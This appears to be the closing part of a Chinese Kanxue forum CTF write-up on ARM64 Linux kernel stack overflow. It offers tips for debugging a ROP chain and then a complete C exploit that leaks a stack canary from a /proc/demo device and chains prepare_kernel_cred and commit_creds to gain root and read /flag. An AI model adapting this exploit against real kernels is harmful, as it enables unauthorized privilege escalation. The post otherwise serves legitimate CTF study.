
构造 `rop` 的时候，要注意 `sp` 的变化，建议是多写一些 `0xaaaaaaaaaaaaaaaa` 这样的数据进去，方便调试，调试完再做替换即可。还有就是可以直接写 `0xaaaaaaaa...0xbbbbbb...`，这样的东西，写多一些，然后看错误回显，看看执行了哪个地址。比如错误回显提示 `call：0xaaaaaaaaaaaaaaaa`，那就可以将 `0xaaaaaaaaaaaaaaaa` 替换为我们要执行的地址，这样很快很方便。

# exp

```c
#include <stdio.h>
#include <string.h>
#include <fcntl.h> // open
#include <stdlib.h> // size_t
#include <sys/stat.h>
#include <fcntl.h>

#define prepare_kernel_cred_addr 0xffff8000080a24f8
#define commit_creds_addr        0xffff8000080a2258
#define vmlinux_base_addr        0xffff800008000000
#define elf_base                 0xffff800000e40000
#define ret2_user_mode           0xffff800008011fe4

void get_shell() {
    printf("[+] got shell, welcome %s\n", (getuid() ? "user" : "root"));
    // system("/bin/sh");

    char buf[0x50] = {0};
    int fd = open("/flag", 0);
    read(fd, buf, 0x50);
    write(1, buf, 0x50);
}

int main() {
    int fd = open("/proc/demo", O_RDWR);
    size_t mem[0x200];

    memset(mem, '\x00', sizeof(mem));
    read(fd, mem, 128 + 8);

    size_t canary = mem[16];
    printf("[+] canary = %p\n", canary);

    // write
    memset(mem, '\x00', sizeof(mem));
    memset(mem, 'a', 0x80);
    mem[16] = canary;
    mem[17] = 0xaaaaaaaaaaaaaaaa;

    // mem[18] = 0xbbbbbbbbbbbbbbbb;
    mem[18] = vmlinux_base_addr + 0x14F50;

    mem[19] = 0xcccccccccccccccc;
    mem[20] = 0xdddddddddddddddd;
    mem[21] = 0xeeeeeeeeeeeeeeee;

    // mem[22] = 0xffffffffffffffff;
    mem[22] = prepare_kernel_cred_addr + 4;

    // mem[23] = commit_creds_addr + 4;
    mem[23] = 0xaaaaaaaaaaaaaaaa;
    mem[24] = 0xccccccccdddddddd;
    mem[25] = 0xeeeeeeeeffffffff;
    mem[26] = 0xaaaaaaaabbbbbbbb;
    mem[27] = 0xccccccccdddddddd;

    // mem[28] = vmlinux_base_addr + 0x14F5C;
    mem[28] = commit_creds_addr + 4;

    // mem[29] = 0xaaaaaaaaaaaaaaaa;
    // mem[30] = 0xbbbbbbbbbbbbbbbb;
    // mem[31] = 0xcccccccccccccccc;

    mem[32] = vmlinux_base_addr + 0x16958;

    mem[33] = 0xaaaaaaaaaaaaaaaa;
    mem[34] = 0xbbbbbbbbbbbbbbbb;
    mem[35] = 0xcccccccccccccccc;
    mem[35] = 0xdddddddddddddddd;

    mem[36] = 0xccccccccdddddddd;
    mem[37] = 0xeeeeeeeeffffffff;
    mem[38] = ret2_user_mode;
    mem[39] = 0xccccccccdddddddd;

    mem[40] = 0xaaaaaaaabbbbbbbb;
    mem[41] = (size_t)get_shell;
    mem[42] = 0x80001000;
    mem[43] = (size_t)mem;

    write(fd, mem, 0x200);
    close(fd);
}
```

[传递专业知识、拓宽行业人脉——看雪讲师团队等你加入！！](https://bbs.kanxue.com/thread-275828.htm)

最后于 2022-5-19 21:05 被 gxh1911 编辑，原因：写错了

[#内核](https://bbs.kanxue.com/forum-171-1-185.htm)

[#溢出](https://bbs.kanxue.com/forum-171-1-182.htm)

[#基础知识](https://bbs.kanxue.com/forum-171-1-180.htm)

[#题解集锦](https://bbs.kanxue.com/forum-171-1-187.htm)
